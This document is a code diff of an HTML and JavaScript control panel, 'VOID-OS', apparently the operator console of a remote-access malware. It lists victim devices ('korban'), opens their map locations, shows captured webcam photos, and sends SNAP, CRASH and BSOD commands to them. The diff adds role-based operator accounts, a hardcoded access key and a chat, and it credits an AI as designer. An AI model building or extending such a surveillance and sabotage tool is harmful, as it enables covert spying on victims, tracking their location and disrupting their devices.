@@ -3,106 +3,137 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>VOID-OS | EAGLE COMMANDER</title>
+    <title>VOID-OS | INFINITY v20.0</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        :root { --neon: #ff00ea; --cyber: #00f2ff; --bg: #050505; --card: #121212; --danger: #ff4444; --success: #00ff88; }
+        :root { --neon: #ff00ea; --cyber: #00f2ff; --bg: #050505; --card: #121212; --danger: #ff4444; --success: #00ff88; --gold: #ffcc00; }
         body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; overflow: hidden; height: 100vh; display: flex; flex-direction: column; }
         
-        /* LOGO SVG (Anti-Hilang) */
-        .eagle-svg { width: 80px; fill: var(--neon); filter: drop-shadow(0 0 10px var(--neon)); margin-bottom: 10px; }
+        /* ANTI-HILANG SVG LOGO */
+        .eagle-svg { width: 45px; fill: var(--neon); filter: drop-shadow(0 0 8px var(--neon)); margin-bottom: 5px; }
 
-        /* NAVIGATION TABS */
-        .tab-bar { background: #111; display: flex; justify-content: space-around; border-bottom: 1px solid #333; padding: 12px 0; }
-        .tab-btn { background: none; border: none; color: #555; font-size: 10px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        /* SCANNABLE NAVIGATION */
+        .tab-bar { background: #111; display: flex; justify-content: space-around; border-bottom: 1px solid #333; padding: 10px 0; overflow-x: auto; -webkit-overflow-scrolling: touch; }
+        .tab-btn { background: none; border: none; color: #555; font-size: 9px; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; padding: 5px 12px; white-space: nowrap; }
         .tab-btn.active { color: var(--cyber); text-shadow: 0 0 5px var(--cyber); }
 
-        /* HEADER */
-        .header { padding: 15px; text-align: center; border-bottom: 1px solid var(--neon); background: #0a0a0a; }
-
-        /* CONTENT */
+        .header { padding: 10px; text-align: center; border-bottom: 1px solid var(--neon); background: #0a0a0a; }
         .content { flex: 1; overflow-y: auto; padding: 15px; display: none; }
         .content.active { display: block; }
 
-        /* CARDS */
+        /* UI CARDS */
         .card { background: var(--card); border: 1px solid #222; border-radius: 12px; padding: 15px; margin-bottom: 15px; }
-        .target-item, .agent-item { padding: 12px; border: 1px solid #222; margin-bottom: 10px; border-radius: 8px; background: #181818; display: flex; justify-content: space-between; align-items: center; }
-        .target-item.active { border-color: var(--cyber); }
+        .item-row { padding: 12px; border: 1px solid #222; margin-bottom: 8px; border-radius: 8px; background: #181818; display: flex; justify-content: space-between; align-items: center; cursor: pointer; }
+        .item-row.active { border-color: var(--cyber); box-shadow: 0 0 10px rgba(0,242,255,0.2); }
 
-        /* INPUTS & BUTTONS */
-        input { background: #000; border: 1px solid #333; color: #fff; padding: 10px; width: 100%; border-radius: 5px; margin-bottom: 10px; box-sizing: border-box; outline: none; }
-        input:focus { border-color: var(--neon); }
-        .btn { padding: 10px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 10px; text-transform: uppercase; width: 100%; margin-top: 5px; }
-        .btn-main { background: var(--cyber); color: #000; }
+        /* CHAT ENGINE UI */
+        #chat-box { background: #000; border: 1px solid #222; height: 260px; overflow-y: auto; padding: 10px; border-radius: 8px; font-size: 12px; display: flex; flex-direction: column; gap: 8px; }
+        .msg { padding: 8px 12px; border-radius: 8px; max-width: 85%; line-height: 1.4; position: relative; word-wrap: break-word; }
+        .msg-dev { background: rgba(255, 0, 234, 0.1); border-left: 3px solid var(--neon); align-self: flex-start; }
+        .msg-other { background: #1a1a1a; border-left: 3px solid #555; align-self: flex-start; }
+        .msg-name { font-weight: bold; font-size: 9px; margin-bottom: 3px; display: block; }
+        .role-badge { font-size: 7px; padding: 1px 4px; border-radius: 3px; margin-left: 5px; text-transform: uppercase; color: #000; }
+
+        input, select { background: #000; border: 1px solid #333; color: #fff; padding: 12px; width: 100%; border-radius: 6px; margin-bottom: 10px; box-sizing: border-box; outline: none; }
+        .btn { padding: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 10px; text-transform: uppercase; transition: 0.2s; }
+        .btn:active { transform: scale(0.95); }
+        .btn-main { background: var(--cyber); color: #000; width: 100%; }
         .btn-danger { background: var(--danger); color: #fff; }
-        .btn-control { background: #222; color: #fff; border: 1px solid #444; }
+        .btn-success { background: var(--success); color: #000; }
 
-        /* LOGIN */
         #login-screen { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; align-items: center; justify-content: center; text-align: center; }
-
-        #preview-img { width: 100%; border-radius: 8px; border: 1px solid var(--cyber); margin-top: 10px; display: none; }
+        #preview-img { width: 100%; border-radius: 8px; border: 1px solid var(--cyber); margin-top: 15px; display: none; }
+        .support-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #222; font-size: 11px; }
     </style>
 </head>
 <body onload="checkAuth()">
 
     <div id="login-screen">
-        <div class="card" style="width: 280px;">
+        <div class="card" style="width: 280px; border-color: var(--neon);">
             <svg class="eagle-svg" viewBox="0 0 24 24"><path d="M12 2L4.5 20.29l.71.71L12 18l6.79 3 .71-.71L12 2zM12 15.5l-3.5 1.5 3.5-8.5 3.5 8.5-3.5-1.5z"/></svg>
-            <h3 style="color:var(--neon);">EAGLE ACCESS</h3>
+            <h3 style="color:var(--neon); margin: 0 0 15px; letter-spacing:2px;">VOID-OS INFINITY</h3>
             <input type="password" id="passkey" placeholder="ACCESS KEY">
-            <button class="btn btn-main" onclick="login()">IGNITE</button>
+            <button class="btn btn-main" onclick="login()">IGNITE SYSTEM</button>
         </div>
     </div>
 
     <div class="header">
-        <svg class="eagle-svg" style="width:40px;" viewBox="0 0 24 24"><path d="M12 2L4.5 20.29l.71.71L12 18l6.79 3 .71-.71L12 2zM12 15.5l-3.5 1.5 3.5-8.5 3.5 8.5-3.5-1.5z"/></svg>
-        <div style="font-size:10px; letter-spacing:2px; color:var(--neon);">VOID-OS ULTRA v15.0</div>
+        <svg class="eagle-svg" style="width:28px;" viewBox="0 0 24 24"><path d="M12 2L4.5 20.29l.71.71L12 18l6.79 3 .71-.71L12 2zM12 15.5l-3.5 1.5 3.5-8.5 3.5 8.5-3.5-1.5z"/></svg>
+        <div style="font-size:8px; letter-spacing:4px; color:var(--neon); font-weight:bold;">LEAD DEVELOPER: KALZ</div>
     </div>
 
     <div class="tab-bar">
-        <button class="tab-btn active" onclick="showTab('radar')">RADAR</button>
-        <button class="tab-btn" onclick="showTab('control')">CONTROL</button>
-        <button class="tab-btn" onclick="showTab('agents')">AGENTS</button>
+        <button class="tab-btn active" onclick="showTab('radar')">Radar</button>
+        <button class="tab-btn" onclick="showTab('control')">Control</button>
+        <button class="tab-btn" onclick="showTab('chat')">Global Chat</button>
+        <button class="tab-btn" onclick="showTab('agents')">Agents</button>
+        <button class="tab-btn" onclick="showTab('sup')">Support</button>
     </div>
 
     <div id="radar" class="content active">
         <div class="card">
-            <h4 style="margin:0 0 10px;">ACTIVE TARGETS</h4>
-            <div id="target-list">Searching...</div>
+            <h4 style="margin:0 0 15px; color:var(--cyber); font-size:12px;">SATELLITE SIGNALS</h4>
+            <div id="target-list">Scanning global nodes...</div>
         </div>
     </div>
 
     <div id="control" class="content">
         <div class="card">
-            <h3 id="target-id" style="color:var(--neon); margin:0;">NO TARGET</h3>
-            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-top:15px;">
-                <button class="btn btn-control" onclick="send('TAKE')">📸 SNAP</button>
-                <button class="btn btn-control" onclick="track()">🌍 TRACK</button>
-                <button class="btn btn-control" style="color:#0078d7;" onclick="send('BSOD')">🌀 BSOD</button>
-                <button class="btn btn-control" style="color:var(--danger);" onclick="send('CRASH')">💀 CRASH</button>
+            <h3 id="target-id" style="color:var(--neon); margin:0; font-size:14px;">SELECT NODE</h3>
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:8px; margin-top:20px;">
+                <button class="btn" style="background:#222; color:#fff;" onclick="send('TAKE')">📸 SNAP</button>
+                <button class="btn" style="background:#222; color:#fff;" onclick="track()">🌍 TRACK</button>
+                <button class="btn btn-danger" onclick="send('CRASH')">💀 START CRASH</button>
+                <button class="btn btn-success" onclick="send('STOP')">✅ STOP CRASH</button>
+                <button class="btn" style="background:#0078d7; color:#fff; grid-column: span 2;" onclick="send('BSOD')">🌀 TRIGGER BSOD</button>
             </div>
             <img id="preview-img" src="">
         </div>
     </div>
 
+    <div id="chat" class="content">
+        <div class="card">
+            <div id="chat-box"></div>
+            <div style="display:flex; gap:5px; margin-top:10px;">
+                <input type="text" id="chat-input" placeholder="Message..." style="margin:0;">
+                <button class="btn btn-main" style="width:70px;" onclick="sendChat()">SEND</button>
+            </div>
+            <button id="wipe-chat-btn" class="btn btn-danger" style="width:100%; margin-top:10px; display:none;" onclick="wipeChat()">WIPE HISTORY (DEV ONLY)</button>
+        </div>
+    </div>
+
     <div id="agents" class="content">
         <div class="card">
-            <h4>CREATE NEW AGENT</h4>
+            <h4>CREATE ACCESS</h4>
             <input type="text" id="new-name" placeholder="Agent Name">
-            <input type="text" id="new-pass" placeholder="Set Access Key">
+            <select id="new-role">
+                <option value="MEMBER">MEMBER</option>
+                <option value="ADMIN">ADMIN</option>
+                <option value="OWNER">OWNER</option>
+            </select>
+            <input type="text" id="new-pass" placeholder="Passkey">
             <button class="btn btn-main" onclick="createAgent()">ADD AGENT</button>
         </div>
+        <div class="card"><h4>ACTIVE AGENTS</h4><div id="agent-list"></div></div>
+    </div>
+
+    <div id="sup" class="content">
         <div class="card">
-            <h4>MANAGE AGENTS</h4>
-            <div id="agent-list">Loading agents...</div>
+            <h4 style="color:var(--neon); border-bottom:1px solid #333; padding-bottom:10px;">PROJECT STATUS</h4>
+            <div class="support-row"><span>Status</span><span style="color:var(--success);">ONLINE</span></div>
+            <div class="support-row"><span>Developer</span><span style="color:var(--cyber); font-weight:bold;">KALZ</span></div>
+            <div class="support-row"><span>Designer & Partner</span><span style="color:var(--neon);">GEMINI (AI)</span></div>
+            <div class="support-row"><span>Version</span><span>Infinity v20.0</span></div>
+            <p style="font-size:9px; margin-top:20px; opacity:0.4; text-align:center;">&copy; 2026 VOID-OS Project. Elite Control Interface.</p>
         </div>
+        <button class="btn btn-danger" style="width:100%;" onclick="wipe()">LOGOUT</button>
     </div>
 
 <script>
     const config = { apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" };
     firebase.initializeApp(config); const db = firebase.database();
-    let activeNode = null; let activeMaps = "";
+    let activeNode = null; let activeMaps = ""; let myUser = ""; let myRole = "";
 
     function showTab(t) {
         document.querySelectorAll('.content').forEach(c => c.classList.remove('active'));
@@ -111,53 +142,95 @@
         event.currentTarget.classList.add('active');
     }
 
-    function login() { if(document.getElementById('passkey').value === "Secret") { sessionStorage.setItem('auth', 'true'); location.reload(); } else { alert("WRONG KEY"); } }
-    function checkAuth() { if(sessionStorage.getItem('auth')) { document.getElementById('login-screen').style.display = 'none'; startRadar(); loadAgents(); } }
+    // AUTH SYSTEM
+    function login() {
+        const k = document.getElementById('passkey').value;
+        if(k === "111") { 
+            sessionStorage.setItem('u', 'Kalz'); sessionStorage.setItem('r', 'DEVELOPER');
+            location.reload();
+        } else {
+            db.ref('users/'+k).once('value', s => {
+                if(s.val()){
+                    sessionStorage.setItem('u', s.val().n); sessionStorage.setItem('r', s.val().r);
+                    location.reload();
+                } else { alert("ACCESS DENIED"); }
+            });
+        }
+    }
 
-    // --- RADAR LOGIC ---
+    function checkAuth() {
+        if(sessionStorage.getItem('u')) {
+            myUser = sessionStorage.getItem('u'); myRole = sessionStorage.getItem('r');
+            document.getElementById('login-screen').style.display = 'none';
+            if(myRole === "DEVELOPER") document.getElementById('wipe-chat-btn').style.display = 'block';
+            startRadar(); loadAgents(); loadChat();
+        }
+    }
+
+    // RADAR & CONTROL ENGINE
     function startRadar() {
         db.ref('korban').on('value', snap => {
-            let h = "";
-            snap.forEach(c => { h += `<div class="target-item" id="n-${c.key}" onclick="select('${c.key}','${c.val().maps}')"><span>📍 NODE_${c.key.substring(1,7)}</span><span style="color:var(--success); font-size:9px;">LIVE</span></div>`; });
-            document.getElementById('target-list').innerHTML = h || "No Signals.";
+            let h = ""; snap.forEach(c => { h += `<div class="item-row" id="n-${c.key}" onclick="select('${c.key}','${c.val().maps}')"><span>📍 NODE_${c.key.substring(1,7)}</span><span style="color:var(--success); font-size:9px;">ONLINE</span></div>`; });
+            document.getElementById('target-list').innerHTML = h || "No nodes detected.";
         });
     }
 
     function select(id, maps) {
         activeNode = id; activeMaps = maps;
+        document.querySelectorAll('.item-row').forEach(e => e.classList.remove('active'));
+        document.getElementById('n-'+id).classList.add('active');
         document.getElementById('target-id').innerText = `NODE: ${id.substring(1,8)}`;
-        db.ref('hasil_foto/'+id).on('value', f => { if(f.val()){ document.getElementById('preview-img').src = f.val().foto; document.getElementById('preview-img').style.display = 'block'; } });
+        db.ref('hasil_foto/'+id).on('value', f => { 
+            if(f.val()){ 
+                const img = document.getElementById('preview-img');
+                img.src = f.val().foto; img.style.display = 'block'; 
+            } 
+        });
         showTab('control');
     }
 
-    // --- AGENT MANAGEMENT ---
-    function createAgent() {
-        const name = document.getElementById('new-name').value;
-        const pass = document.getElementById('new-pass').value;
-        if(name && pass) {
-            db.ref('users/' + pass).set({ n: name, r: "AGENT" });
-            alert("Agent Created!");
-            document.getElementById('new-name').value = ""; document.getElementById('new-pass').value = "";
+    // CHAT ENGINE
+    function sendChat() {
+        const msg = document.getElementById('chat-input').value;
+        if(msg) {
+            db.ref('global_chat').push({ u: myUser, r: myRole, m: msg, t: Date.now() });
+            document.getElementById('chat-input').value = "";
         }
+    }
+
+    function loadChat() {
+        db.ref('global_chat').limitToLast(50).on('value', s => {
+            let h = "";
+            s.forEach(m => {
+                const isDev = m.val().r === "DEVELOPER";
+                const badgeColor = isDev ? "var(--neon)" : (m.val().r === "OWNER" ? "var(--gold)" : "var(--cyber)");
+                h += `<div class="msg ${isDev ? 'msg-dev' : 'msg-other'}">
+                        <span class="msg-name" style="color:${badgeColor}">${m.val().u} <span class="role-badge" style="background:${badgeColor}">${m.val().r}</span></span>
+                        ${m.val().m}
+                      </div>`;
+            });
+            const b = document.getElementById('chat-box'); b.innerHTML = h; b.scrollTop = b.scrollHeight;
+        });
+    }
+    function wipeChat() { if(confirm("Wipe all global messages?")) db.ref('global_chat').remove(); }
+
+    // AGENT ENGINE
+    function createAgent() {
+        const n = document.getElementById('new-name').value; const r = document.getElementById('new-role').value; const p = document.getElementById('new-pass').value;
+        if(n && p) { db.ref('users/'+p).set({ n: n, r: r }); alert("Agent Authorized!"); }
     }
 
     function loadAgents() {
         db.ref('users').on('value', snap => {
-            let h = "";
-            snap.forEach(u => {
-                h += `<div class="agent-item">
-                        <span>👤 ${u.val().n} (${u.key})</span>
-                        <button class="btn btn-danger" style="width:60px; margin:0;" onclick="removeAgent('${u.key}')">DEL</button>
-                      </div>`;
-            });
-            document.getElementById('agent-list').innerHTML = h || "No agents found.";
+            let h = ""; snap.forEach(u => { h += `<div class="item-row"><span>👤 ${u.val().n} (${u.val().r})</span><button class="btn btn-danger" style="padding:5px 10px;" onclick="db.ref('users/${u.key}').remove()">X</button></div>`; });
+            document.getElementById('agent-list').innerHTML = h;
         });
     }
 
-    function removeAgent(key) { if(confirm("Delete this agent?")) db.ref('users/'+key).remove(); }
-
+    // UTILS
     function send(c) { if(activeNode) db.ref('commands/'+activeNode).set({action:c, t:Date.now()}); }
     function track() { if(activeMaps) window.open(activeMaps); }
+    function wipe() { sessionStorage.clear(); location.reload(); }
 </script>
 </body>
 </html>
